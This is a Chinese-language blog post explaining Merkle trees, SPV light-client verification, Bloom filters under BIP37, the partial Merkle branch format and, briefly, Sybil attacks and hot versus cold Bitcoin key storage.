<p>如果A和B两个服务器上存储的文件系统都是一致的，也即两个的哈希值是一样的，那么自然是很好的。如果两个不一致呢？譬如说A服务器上有一个文件更新了，而B服务器还没有来得及更新。怎么样能够快速地定位到导致两个文件系统不一致的文件？</p>
<p>这时就能体现树结构的好处了。如果两个哈希值不一致，A服务器就可以向B服务器要两个子节点的哈希值；然后沿着不一样的路径一直走下去，从而可以确定导致根哈希值不同的文件。而且确定这个不一致文件的复杂度是？</p>
<p>以上是分布式文件服务器的例子。那么在比特币中，Merkle树的作用是什么呢？</p>
<p>默认情况下，一旦接受到一个新交易，节点需要验证它，特别是，验证交易的输入中的每一个之前是否被花费。为了完成这个验证，需要访问区块链。如果节点不信任网络上的其他节点，那么 这个节点需要保存网络上的所有区块，以便验证交易。这种节点称作全节点。在比特币发展的早期，所有节点都是全节点；当前的比特币核心客户端也是完整区块链节点。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233039.jpg" alt="img"></p>
<p>在当前的比特币网络中，实际参与共识的全验证节点（fully validating nodes）并不多，因为全验证节点会维护整个区块链的数据，由于区块链的不可篡改和append-only，随着时间的增加，整个区块链的数据量非常大。在2014年4月份，比特币网络中存储所有区块的数据，需要15GB的空间，现在要完整下载比特币的所有区块数据，需要200GB以上的空间。</p>
<p>全节点要检查第300,000号区块中的某个交易，它会把从该区块开始一直回溯到创世区块的300,000个区块全部都链接起来，建立一个完整的UTXO数据库，通过确认该UTXO是否还未被支付来证实交易的有效性。全验证节点维护所有的UTXO， 最好是存在RAM中，这样，当网络中有新的交易广播时，全验证节点可以快速地进行查询、运行脚本、确定交易是否正确、签名是否有效，如果全部正确，则将交易添加到交易池中。</p>
<h3 id="SPV-simple-payment-verification"><a href="#SPV-simple-payment-verification" class="headerlink" title="SPV(simple payment verification)"></a>SPV(simple payment verification)</h3><p>全验证节点对硬件提出了很高要求，个人用户（移动设备）参与这个过程几乎是不可能的。为了客户友好，对于仅仅使用钱包的普通用户，也即轻量级的节点，比特币网络中的大部分用户都是轻量级的用户，比特币网络并不要求它们也存储所有的信息。这种节点只需要维护能够验证用户自己所care的交易的部分信息就行了。这也是中本聪在比特币白皮书中所提出的SPV（simple payment verification）的概念。SPV可以不需整个网络的数据而确认交易是否存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233040.jpg" alt="img"></p>
<p>轻量级节点往往只需要存储区块链头部就可以了。使用有限的信息，轻节点就能够证明某一笔交易是否存在与区块链中。区块头是80字节，一个区块至少是1M，完整交易的区块比区块头的要大的多。因为区块头部信息很少，每年的增加总量大概是在5M左右，所以简单的硬件设备也完全可以运行。</p>
<p>那问题是，SPV是怎么实现的呢？为什么仅仅需要有限的信息就可以进行验证？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233041.jpg" alt="img">中本聪比特币白皮书中的例子</p>
<p>譬如用户Bob收到用户Alice发来的一笔支付交易，这时Bob必须要验证这笔交易（1）确实存在，并且（2）不是双重支付。对于SPV用户而言，需要从可信节点获得区块链的完整的头部信息，以及和他想验证的交易的Merkle分支。这样，虽然用户不能自己验证交易，但如果能够从区块链的某处找到符合的交易，就可以知道这笔交易已被网络确认，也可以确认该笔交易得到网络多少笔确认。譬如，SPV节点要验证第300,000号区块中的某个交易，它需要获得300,000区块中交易的Merkle分支（Merkle路径）进行验证，并且等到序号从300,001到300,006的六个区块堆叠在该交易所在的区块上。如果网络中的其他节点都接受了第300,000区块，并通过足够的工作在该块之上又生成了六个区块，就可以证明该交易不是双重支付。</p>
<p>使用Merkle分支进行验证是Merkle树的Tamper proof性质， 使用Merkle树之后，可以很容易验证区块中的交易有没有被篡改。譬如在上图中的例子，如果一个交易 T<sub>H</sub>被篡改成了 T<sub>?</sub> ，那么交易的哈希值会不同，沿着从底层到根节点的路径向上，会导致最终树的merkle root不同，也即保存在区块链头的值不同。相反，如果从叶子节点到Merkle根的路径上，所有的哈希值都验证正确，那么可以证明这个交易确实存在于这个区块中。</p>
<p>如上图，如果需要证明某个区块上是否存在一笔交易Tx3，那么全节点返回的Merkle路径是Hash2和Hash01。只需要这两个值就可以进行验证过程如下：</p>
<ul>
<li>Step1：计算交易Tx3的哈希值，得到Hash3</li>
<li>Step2：通过Hash2和Hash3的哈希值，得到父节点的哈希值Hash23</li>
<li>Step3：同上，通过计算Hash23和Hash01哈希值，得到根节点的哈希值。</li>
<li>Step4：将上一步得到的根哈希值对比区块头中MerkleTree的根哈希值，如果相同，则证明该区块中存在交易Tx3，否则说明不存在。</li>
</ul>
<p>使用Merkle树可以大大降低SPV节点的存储和计算负担；下面的表格对比了区块中不同交易数量的情况下，完整区块大小和Merkle路径大小的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233042.jpg" alt="img"></p>
<p>SPV节点的安全性</p>
<p>（1）若全节点返回的是一条恶意的路径？试图为一个不存在于区块链中的节点伪造一条合法的merkle路径，使得最终的计算结果与区块头中的默克尔根哈希相同。</p>
<p>由于哈希的计算具有不可预测性，使得一个恶意的“全”节点想要为一条不存在的节点伪造一条“伪路径”使得最终计算的根哈希与轻节点所维护的根哈希相同是不可能的。</p>
<p>（2）为什么不直接向全节点请求该节点是否存在于区块链中？</p>
<p>由于在公链的环境中，无法判断请求的全节点是否为恶意节点，因此直接向某一个或者多个全节点请求得到的结果是无法得到保证的。但是轻节点本地维护的区块头信息，是经过工作量证明验证的，也就是经过共识一定正确的，若利用全节点提供的Merkle路径，与待验证的节点进行哈希计算，若最终结果与本地维护的区块头中根哈希一致，则能够证明该节点一定存在于默克尔树中。</p>
<p>（3）SPV容易受到什么攻击？</p>
<p>SPV节点毫无疑问可以证实某个交易的存在性，它也能够证明某个区块中不存在某个交易，但它不能验证某个交易（譬如同一个UTXO的双重支付）在整个链中不存在，这是因为SPV节点没有一份关于所有交易的记录。这个漏洞会被针对SPV节点的拒绝服务攻击或双重支付型攻击所利用。为了防御这些攻击，SPV节点需要随机连接到多个节点，以增加与至少一个可靠节点相连接的概率。这种随机连接的需求意味着SPV节点也容易受到网络分区攻击或Sybil攻击。在后者情况中，SPV节点被连接到虚假节点或虚假网络中，没有通向可靠节点或真正的比特币网络的连接。</p>
<p>在绝大多数的实际情况中，具有良好连接的SPV节点是足够安全的，它在资源需求、实用性和安全性之间维持恰当的平衡。当然，如果要保证万无一失的安全性，最可靠的方法还是运行完整区块链的节点。</p>
<blockquote>
<p>完整的区块链节点是通过检查整个链中在它之下的数千个区块来保证这个UTXO没有被支付，从而验证交易。而SPV节点是通过检查在包含该交易的区块所收到的确认数目来验证交易。</p>
</blockquote>
<h2 id="Sybil攻击"><a href="#Sybil攻击" class="headerlink" title="Sybil攻击"></a>Sybil攻击</h2><p>Sybil攻击是指利用社交网络中的少数节点控制多个虚假身份，从而利用这些身份控制或影响网络的大量正常节点的攻击方式 。</p>
<p>直接通信：进行sybil攻击的一种形式是sybil结点直接与合法结点进行通信。当合法结点发送一个无线消息给sybil结点时，sybil结点中的一个会监听这个消息。同样地，从所有sybil结点发送出的消息事实上也是从同一个恶意设备发出的。</p>
<p>间接通信：在这个版本的攻击中，没有一个合法的结点能够直接与sybil结点进行通信。相反，一个或多个恶意的结点宣称他们能够到达sybil结点。因此，发送给sybil结点的消息都是通过其中的一个恶意结点进行路由转发的，这个恶意结点假装把这个消息发送给sybil结点，而事实上就是这个恶意结点自己接收或者拦截了这个消息。</p>
<p>伪造身份：在某些情况下，一个攻击者可以产生任意的sybil身份。比如说如果一个结点的身份是一个32-位的整数，那么攻击者完全可以直接为每一个sybil结点分配一个32-位的值作为它的身份。</p>
<p>盗用身份：如果给定一种机制来识别结点的身份，那么攻击者就不能伪造身份了。举个例子来说，命名空间，由于命名空间本身就是有限的，根本不允许插入一个新的身份。在这种情况下，攻击者需要分配一个合法的身份给sybil结点。这种身份盗用在攻击者把原有结点摧毁或者使之失效的情况下是不好检测的。</p>
<p>同时攻击：攻击者将其所有的sybil身份一次性的同时参与到一次<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1">网络通信</a>中。如果规定一个结点只能使用它的身份一次，那么这个恶意结点就可以循环的使用它的多个sybil身份让人看起来是多个结点。这就是<a href="https://baike.baidu.com/item/%E5%90%8C%E6%97%B6%E6%80%A7/3245687">同时性</a>。</p>
<p>非同时攻击：如果攻击者只在一个特定的<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E5%91%A8%E6%9C%9F/7539382">时间周期</a>里使用一部分sybil身份，而在另外一个时间段里是这些身份消失而以另外的sybil身份出现，这看起来就像网络中正常的结点撤销和加入。</p>
<h2 id="Bloom-Filter"><a href="#Bloom-Filter" class="headerlink" title="Bloom Filter"></a>Bloom Filter</h2><p>在之前的例子中，我们并没有涉及一些细节。譬如，SPV节点直接就向全节点请求某一交易的Merkle路径。SPV节点怎么样从网络中接收到与自己相关的交易，确定交易所在的区块呢？</p>
<p>SPV节点一般只需要的是和自己的地址相关的交易。在BIP37之前，SPV的做法是将所有的区块和交易都下载下来，然后本地将不相关的交易给删掉。当然带来的问题就是同步慢、浪费带宽、增加内存使用。在BIP-37中就提到了因为这一点，导致用户对手机APP“Bitcoin Wallet”有所抱怨。</p>
<p>为了解决这个问题，最直接的做法就是SPV节点仅向全节点请求和自己地址相关的交易，也即请全节点过滤和自己地址不相关的信息，如果全节点发现某个交易符合SPV节点的需求时，就将以Merkleblock消息的形式发送该交易，Merkleblock消息包含区块头和Merkle路径。此时，SPV就需要在请求中附上自己的地址信息。</p>
<p>因此与全区块链节点收集每一个区块内的全部交易所不同，SPV节点对特定数据的请求可能无意中透露了钱包里的地址信息。如果监控网络的第三方跟踪某个SPV节点上的钱包所请求的全部交易信息，就能利用这些交易信息把比特币地址和钱包的用户关联起来。</p>
<p>举例来说，如果在问路时，使用具体的地址，如“南京路188号”，那么可能得到具体的位置；但同时也泄露了目的地。如果问不同的人，188号在哪里？可能得到所有188号的信息；然后问南京路在哪里？可以得到一整条路的信息。那么虽然获得的答案中包括一些无关的信息；但是，相对应的，隐私得到了一定程度的保护。</p>
<p>因此，在引入SPV节点&#x2F;轻量级节点后不久，比特币开发人员就添加了一个新功能：Bloom过滤器。这是在2012年的BIP37中引入的。<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a> 在比特币中，使用Bloom过滤器来加快钱包同步；以太坊使用Bloom过滤器用于快速查询以太坊区块链的日志。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233043.jpg" alt="img"></p>
<p>布隆过滤器（Bloom Filter）是1970年由布隆提出的，用来判断某个元素是否在集合内，它具有运行速度快（时间效率），占用内存小的优点（空间效率），但是有一定的误识别率和删除困难的问题。它能够判断某个元素一定不在集合内或可能在集合内，也即Bloom Filter会造成一定的False Positive，但是不会造成False Negative。</p>
<p>Bloom过滤器的实现是由一个可变长度（N）的二进制数组（N位二进制数构成一个位域）和数量可变（M）的一组哈希函数组成。这些哈希函数的输出值始终在1和N之间，并且该函数为确定性函数，也即对特定输入总是得到同一个的结果。Bloom过滤器的准确性和私密性能通过改变长度（N）和哈希函数的数量（M）来调节。</p>
<p>与其它数据结构相比较，Bloom filter的优点包括：空间效率和查找时间复杂性；不需要存储元素本身，在保护隐私方面具有优势。</p>
<p>下面通过一些例子来具体解释Bloom Filter的工作原理。</p>
<p>这里使用十六位数组（N&#x3D;16）和三个哈希函数（M&#x3D;3）来演示Bloom过滤器的应用原理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233044.jpg" alt="img"></p>
<p align="center">由16位数组和3个哈希函数组成的简易Bloom Filter</p>

<p>Bloom过滤器数组里的每一个数的初始值为零。关键词被加到Bloom过滤器中之前，会依次通过每一个哈希函数运算一次。该输入经第一个哈希函数运算后得到了一个在1和N之间的数，它在该数组（编号依次为1至N）中所对应的位被置为1，从而把哈希函数的输出记录下来。接着再进行下一个哈希函数的运算，把另外一位置为1；以此类推。当全部M个哈希函数都运算过之后，一共有M个位的值从0变成了1，这个关键词也被“记录”在了Bloom过滤器里。</p>
<p>向上图中的简易Bloom过滤器添加关键词“A”。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233045.jpg" alt="img"></p>
<p align="center">向简易Bloom过滤器中增加关键词“A”</p>

<p>增加第二个关键词就是简单地重复之前的步骤。关键词依次通过各个哈希函数运算之后，相应的位变为1，Bloom过滤器则记录下该关键词。需要注意的是，当Bloom过滤器里的关键词增加时，它对应的某个哈希函数的输出值的位可能已经是1了，这种情况下，该位不会再次改变。也就是说，随着更多的关键词指向了重复的位，Bloom过滤器随着位1的增加而饱和，准确性也因此降低了。该过滤器之所以是基于概率的数据结构，就是因为关键词的增加会导致准确性的降低。准确性取决于关键字的数量以及数组大小（N）和哈希函数的多少（M）。更大的数组和更多的哈希函数会记录更多的 关键词以提高准确性。而小的数组及有限的哈希函数只能记录有限的关键词从而降低准确性。</p>
<p>【更大的数组可以提高准确性很好理解，因为可以降低冲突；如何理解需要更多哈希函数呢？这里主要是考虑到数组的大小一般而言是比较有限的，因此在单个哈希函数的时候，冲突是不可避免的；但是多个哈希函数同时发生碰撞的可能性就比较小。譬如有一个关键字”abc”被加入进来，只有只有一个哈希函数，有可能“xyz”会和”abc”发生碰撞，此时不能判断”xyz”是不是关键字。但是如果有三个哈希函数，“xyz”和”abc”在三个哈希函数中都碰撞的概率就比较小。】</p>
<p>问题：如果N比较小，当添加关键词时，所有的位都成为1，意味着什么？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233046.jpg" alt="img">向Bloom Filter增加关键词</p>
<p>为测试某一关键词是否被记录在某个Bloom过滤器中，则将该关键词逐一代入各哈希函数中运算，并将所得的结果与原数组进行对比。如果所有的结果对应的位都变为了1，则表示这个关键词有可能已被该过滤器记录。之所以这一结论并不确定，是因为这些字节1也有可能是其他关键词运算的重叠结果。简单来说，Bloom过滤器正匹配代表着“可能是”。</p>
<p>下图是一个验证关键词“X”是否在前述Bloom过滤器中的例子。相应的比特位都被置为1，所以这个关键词很有可能是匹配的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233047.jpg" alt="img"></p>
<p>测试关键词“X“是否能通过Bloom Filter</p>
<p>另一方面，如果我们代入关键词计算后的结果某位为0，说明该关键词并没有被记录在过滤器里。负匹配的结果不是可能，而是一定。也就是说，负匹配代表着“一定不是”。</p>
<p>下图验证关键词“Y”是否存在于简易Bloom过滤器中的图例。图中某个结果字段为0，该字段一定没有被匹配。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233048.jpg" alt="img"></p>
<p>通过使用Bloom Filter，使得SPV节点只接收交易信息的子集，同时不会泄露哪些是它们感兴趣的地址。实际上，再对Bloom Filter进行设置时，如果带宽和硬件条件宽裕，SPV节点可以选择具有高FP（false positive）率的Bloom Filter，此时如果有第三方对SPV进行跟踪，看到的将是大量的数据中混杂着与节点相关的数据，从而隐私性得到了保护。相反，如果带宽和硬件条件不宽裕，则可以选择尽可能精确的设置从而过滤掉不相关的数据，但是第三方就有可能将交易和IP地址关联起来。</p>
<p><strong>工作过程</strong></p>
<p>首先，SPV节点会初始化一个不会匹配任何关键词的“空白”Bloom过滤器。接下来，SPV节点会创建一个包含钱包中所有地址信息的列表，并创建一个与每个地址相对应的交易输出相匹配的搜索模式。通常，这种搜索模式是一个向公钥付款的哈希脚本，该脚本是一个会出现在每一个向公钥哈希地址（P2PKH）付款的交易中的锁定脚本。如果SPV节点需要追踪P2SH地址余额，搜索模式就会变成P2SH脚本。然后，SPV节点会把每一个搜索模式添加至Bloom过滤器里，这样只要关键词出现在交易中就能够被过滤器识别出来。最后，对等节点会用收到的Bloom过滤器来匹配传送至SPV节点的交易。</p>
<p><strong>用来filter的数据可以是tx.hash,也可以是txout.scriptPubKey中的data，也可以是txin.scriptSig中的data</strong> </p>
<p>Filter匹配算法</p>
<p>Bloom filter可以用于测试任何的数据，查看数据是否与用户加入filter中的数据相关。</p>
<p>在BIP37中，确定交易是否匹配filter，使用以下算法，一旦发现了匹配，则算法停止。</p>
<ol>
<li>测试交易本身的哈希。</li>
<li>对于每个输出，测试输出脚本中的每一个数据项。每一个哈希（密钥）都单独测试。如果在测试交易的时候发现了匹配的输出，那么节点也可以升级filter，将该输出的COutPoint结构也添加到filter中。也即，将该交易的输出中与SPV用户自己相关的部分（可用于其他交易的输入）添加到filter中。</li>
<li>对于每一个输入，测试COutPoint结构。</li>
<li>对于每一个输入，测试输入脚本ScriptSig的每一个数据项。</li>
<li>否则，没有匹配。</li>
</ol>
<p>来分析一下：</p>
<ol>
<li>步骤1是因为用户有可能对某一个特定的交易感兴趣；</li>
<li>步骤2是因为用户可能在过滤器中加入了自己的公钥或地址；如果某一笔交易发钱给自己，那么用该COutpoint来更新过滤器；【检查自己的收入】</li>
<li>步骤3检查自己的花费；</li>
<li>步骤4检查自己的花费；</li>
</ol>
<p>问题：哪些数据应该加入到filter中呢？</p>
<p>在上面的算法中，在step 2中提到“匹配的输出，那么节点也可以更新filter，将该输出的COutPoint结构也添加到filter中”。为什么要对filter进行及时的更新呢？</p>
<p>为啥要加入coutpoint，这里我们可以理解coutpoint是包括了(txid，coutputid)的一个数据结构。</p>
<p>The test for outpoints is there to ensure you can find transactions spending outputs in your wallet, even though you don’t know anything about their form. As you can see, once set on a connection the filter is <strong>not static</strong> and can change throughout the connections lifetime. This is done to avoid the following race condition:</p>
<p>A client sets a filter matching a key in their wallet. They then start downloading the block chain. The part of the chain that the client is missing is requested using getblocks.</p>
<ol>
<li>The first block is read from disk by the serving peer. It contains TX 1 which sends money to the clients key. It matches the filter and is thus sent to the client.</li>
<li>The second block is read from disk by the serving peer. It contains TX 2 which spends TX 1. However TX 2 does not contain any of the clients keys and is thus not sent. The client does not know the money they received was already spent.</li>
</ol>
<p>对outpoints的测试是为了确保能找到花费钱包中的输出的交易，即使你对它们的形式一无所知。正如你所看到的，一旦在连接上设置了过滤器，过滤器就不是静态的，它可以在整个连接的生命周期内改变。这样做是为了避免出现下面的race condition。</p>
<p>客户端设置了与钱包中的密钥（公钥、地址）相匹配的过滤器。然后他们开始下载区块链。客户端缺少的那部分区块链是使用getblocks请求的。</p>
<ul>
<li>第一个区块是由服务节点从磁盘上读取的。它包含TX 1，TX1向客户的密钥（公钥、地址）发送资金。它与过滤器相匹配，因此被发送到客户端。</li>
<li>第二个块是由服务节点从磁盘上读取的。它包含TX 2，它花费了TX 1。然而TX 2不包含任何客户的密钥（公钥、地址），因此没有被发送。客户端不知道他们收到的钱已经被花掉了。</li>
</ul>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低。用户可能需要定时刷新filter。</p>
<p>另外提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；</p>
<p>另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>思考：为什么有Bloom_update_P2PUBKEY_ONLY选项？</p>
<p>【在P2PKH类型的交易中，如果要花费，则在scriptsig中一定会有用户的公钥提供，所以用户可以通过在filter中添加自己的公钥来查询；从而防止filter性能快速下降】</p>
<p>问题：能不能通过删除项来更新bloom filter?</p>
<p>字符串加入了就被不能删除了，因为删除会影响到其他字符串。实在需要删除字符串的可以使用Counting bloomfilter(CBF)，这是一种基本Bloom Filter的变体，CBF将基本Bloom Filter每一个Bit改为一个计数器，这样就可以实现删除字符串的功能了。</p>
<p>　　Bloom Filter跟单哈希函数Bit-Map不同之处在于：Bloom Filter使用了k个哈希函数，每个字符串跟k个bit对应。从而降低了冲突的概率。</p>
<p>最后，分析一下Bloom Filter的效率和内容占用情况，为何说它速度快，占用内存小。</p>
<p>Bloom filter被广泛应用于各种领域，比如拼写检查、字符串匹配算法、网络包分析工具、Web Cache、文件系统、存储系统等。</p>
<p>这里举例分析一下Bloom filter在重复数据删除应用中的空间和时间效率。重复数据删除技术的基本原理是对文件进行定长或变长分块，然后利用hash函数计算数据块指纹，如果两个数据块指纹相同则认为是重复数据块（存在数据碰撞问题），只保存一个数据块副本即可，其他相同数据块使用该副本索引号表示，从而实现数据缩减存储空间并提高存储效率。</p>
<p>为了查询一个数据块是否重复或者已经存在，需要计算数据块指纹并进行查找，并记录所有唯一数据块的指纹。举一个例子：32TB的数据，平均数据块大小为8KB，每个数据块使用MD5和SHA1计算两个指纹并用64位整数表示唯一块号则共占用44字节((128+160+64)&#x2F;8），则总共最多需要176GB（32TB&#x2F;8KB * 44 Byte）的存储空间来保存数据块信息。</p>
<p>现在的去重系统数据容量通常多达数十到数百TB，如果把数据块信息全部保存在内存中，显然对内存的需求量非常巨大。通常的做法是把数据块信息保存在磁盘或SSD上，使用一定内存量作 Cache缓存数据块指纹，利用时间局部性和空间局部性来提高查找性能。这种方法的一个关键问题是，如果新的数据块是不重复的，查找时会出现Cache不命中，从而引起大量的磁盘读写操作。由于磁盘或SSD性能要远远小于内存的，对查找性能影响非常大。</p>
<p>Bloom filter可以有效解决这个问题，DataDomain中的Summary Vector就是采用Bloom filter来实现的。对于前面的例子，一个数据块用3个hash函数计算指纹最多占用3个位，则Bloom filter仅需要1.5GB &#x3D; 32TB&#x2F;8KB * 3 &#x2F;8 bytes的内存空间。引入Bloom filter机制后，对于一个新数据块，首先查找Bloom filter，如果未命中则说明这是一个新的唯一数据块，直接保存数据块和并Cache数据块信息即可；如果命中，则说明这有可能是一个重复数据块，需要通过进一步的hash或tree查找进行确认，此时需要Cache与Disk进行交互。受益于Bloom filter以及Cache，DataDomain系统可以减少99%的磁盘访问，从而利用少量的内存空间大幅提高了数据块查重性能。</p>
<p>最后：BIP37中介绍了Merkle路径的构造。</p>
<h2 id="Partial-Merkle-branch-format"><a href="#Partial-Merkle-branch-format" class="headerlink" title="Partial Merkle branch format"></a>Partial Merkle branch format</h2><p>A <em>Merkle tree</em> is a way of arranging a set of items as leaf nodes of tree in which the interior nodes are hashes of the concatenations of their child hashes. The root node is called the <em>Merkle root</em>. Every Bitcoin block contains a Merkle root of the tree formed from the blocks transactions. By providing some elements of the trees interior nodes (called a <em>Merkle branch</em>) a proof is formed that the given transaction was indeed in the block when it was being mined, but the size of the proof is much smaller than the size of the original block.</p>
<h2 id="Constructing-a-partial-merkle-tree-object"><a href="#Constructing-a-partial-merkle-tree-object" class="headerlink" title="Constructing a partial merkle tree object"></a>Constructing a partial merkle tree object</h2><ul>
<li><p>Traverse the merkle tree from the root down, and for each encountered node:</p>
</li>
<li><ul>
<li><p>Check whether this node corresponds to a leaf node (transaction) that is to be included OR any parent thereof: </p>
</li>
<li><ul>
<li>If so, append a ‘1’ bit to the flag bits 【要么是节点本身，要么是其祖先】</li>
<li>Otherwise, append a ‘0’ bit.</li>
</ul>
</li>
<li><p>Check whether this node is a internal node (non-leaf) AND is the parent of an included leaf node: 【如果是节点祖先，那么才继续处理其孩子；否则，孩子跳过；注意叶子节点也需要添加hash，实际上要处理的叶子节点只有目标节点和它的兄弟节点】</p>
</li>
<li><ul>
<li><p>If so:</p>
</li>
<li><ul>
<li>Descend into its left child node, and process the subtree beneath it entirely (depth-first).</li>
<li>If this node has a right child node too, descend into it as well.</li>
</ul>
</li>
<li><p>Otherwise: append this node’s hash to the hash list.</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段的结果是，从根往下遍历，能够将需要返回的Merkle路径的所有节点的flag设置为0】</p>
<h2 id="Parsing-a-partial-merkle-tree-object"><a href="#Parsing-a-partial-merkle-tree-object" class="headerlink" title="Parsing a partial merkle tree object"></a>Parsing a partial merkle tree object</h2><p>As the partial block message contains the number of transactions in the entire block, the shape of the merkle tree is known before hand. Again, traverse this tree, computing traversed node’s hashes along the way:</p>
<ul>
<li><p>Read a bit from the flag bit list:</p>
</li>
<li><ul>
<li><p>If it is ‘0’:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is a leaf node:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, store it as a matched txid, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is an internal node:</p>
</li>
<li><ul>
<li><p>Descend into its left child tree, and store its computed hash as L.</p>
</li>
<li><p>If this node has a right child as well:</p>
</li>
<li><ul>
<li>Descend into its right child, and store its computed hash as R.</li>
<li>If L &#x3D;&#x3D; R, the partial merkle tree object is invalid.</li>
<li>Return Hash(L || R).</li>
</ul>
</li>
<li><p>If this node has no right child, return Hash(L || L).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段是对返回的Merkle路径上的哈希值进行处理验证】</p>
<p>The partial merkle tree object is only valid if:</p>
<ul>
<li>All hashes in the hash list were consumed and no more.</li>
<li>All bits in the flag bits list were consumed (except padding to make it into a full byte), and no more.</li>
<li>The hash computed for the root node matches the block header’s merkle root.</li>
<li>The block header is valid, and matches its claimed proof of work.</li>
<li>In two-child nodes, the hash of the left and right branches was never equal.</li>
</ul>
<p>【关于以上算法，让人非常迷惑的地方在于，假设对树的结构已知的情况下，为何需要如此麻烦的算法。假设在一棵有16个叶子节点的满二叉树上，针对任何一个叶子都可以很容易算出Merkle路径（给定编号）；而且在获得Merkle路径的哈希值之后，只要从后向前依次合并计算即可；这是2018年时的迷惑】</p>
<p>看了两年之后，终于悟了。上面的算法本身就是在对树结构已知的情况下，判断一个节点是否是目标节点的祖先。同时，经过一遍遍历，便获得所需的信息。【一个猜想是，这里的数据结构是KV结构，不能像数组那样可以直接根据下表索引获得内容；所以只能通过遍历的方式获得。所以，还是得去看源码】</p>
<p>理一遍过程：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233049.jpg" alt="img"></p>
<p>以8个交易的满二叉树为例。假设我们的目标是第三个交易，也即上图中的节点10。那么根据算法，深度优先算法遍历，需要处理的节点是1、2、4、5、10、11、3；获得的标记list是1、1、0、1、1、0、0；获得的hashlist是null、null、hash、null、hash、hash、hash。</p>
<p>在进行解析的过程中，从1开始，进入左节点，找到2，2对应的标记是1并且是内部节点，所以继续找到4，4对应的标记是0，从hashlist返回哈希值；接着处理5，5的标记是1且是内部节点，分别处理10和11；10和11都返回哈希值，从而可以计算出5的哈希值；获得4和5的哈希值之后，2可以计算得出哈希值；1的左孩子处理完成；接着处理3，3的标记是0，直接返回哈希值，从而可以计算得出1的哈希值，也就是merkleroot。此时可以将该计算结果与SPV存储的区块头信息进行对比。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://cloud.tencent.com/developer/article/1082346">理解区块链背后的Merkle Tree</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.coingogo.com/article/1690">https://www.coingogo.com/article/1690</a></li>
<li><a href="https://link.zhihu.com/?target=http://haroldcarr.com/posts/2017-07-31-the-block-in-blockchain-merkle-trees.html">the block in blockchain explained (merkle trees)</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/merkle-patricia-tree-in-detail">干货 | Merkle Patricia Tree 详解</a></li>
<li><a href="https://link.zhihu.com/?target=https://shuwoom.com/?p=692">Merkle树和SPV机制 | shuwoom的博客</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/1/master_bitcoin/_book/6/6.html">第6章 比特币网络 · 精通比特币-巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/liuaigui/article/details/6602683">深入理解Bloom Filter</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/46b07467373a">https://www.jianshu.com/p/46b07467373a</a> （有代码）</li>
</ol>
<h1 id="区块链技术10-如何存储和使用比特币"><a href="#区块链技术10-如何存储和使用比特币" class="headerlink" title="区块链技术10:如何存储和使用比特币"></a>区块链技术10:如何存储和使用比特币</h1><p>管理私钥需要考虑三个目标，所有各种保管密钥的方法就是这三个目标的折中：</p>
<ol>
<li>可用性：当需要使用比特币的时候，可以用得上；</li>
<li>安全性：保证其他人不能使用你的私钥；</li>
<li>方便性：用的时候比较简单。</li>
</ol>
<p>我们来考虑下，如果把密钥写在纸上，那考虑到可用性，就需要随身把纸带在身上，那安全性就不用说了，方便性的话，输入起来也不方便。保存在电脑上也同样的问题，如果电脑被偷了，或者说电脑崩溃了，那所有的钱都没了；如果有人黑进了你的电脑，所有的币也都没了。</p>
<p>所以把私钥保存在本地机器上，特别是移动设备上，相当于把所有的钱都装在钱包里带在身上。如果手机丢了，所有的比特币也都丢了。</p>
<p>（现在有很多钱包软件和硬件，帮忙管理私钥，特别是用户有多个账户时，使用钱包帮忙管理是非常有效的。而且钱包软件可以帮忙方便地查看余额和交易等信息。）</p>
<p>将密钥存在移动设备就像把钱带在身上，方便使用但是安全性不佳，这种方式叫做“Hot strorage”；另一种方式是将密钥锁起来，不上网，用起来不方便，但是很安全，这种叫做“cold storage”（将经过Passphrase加密后的私钥写在纸上是不错的方法）。保存纸币时我们正常的做法是带点零钱在身上，然后将大部分的积蓄放在银行里。也即hot storage和cold storage相结合。</p>
<p>所以，很明显，需要对Hot storage和cold storage准备不同的密钥。否则，分开存储就没有任何意义了。</p>
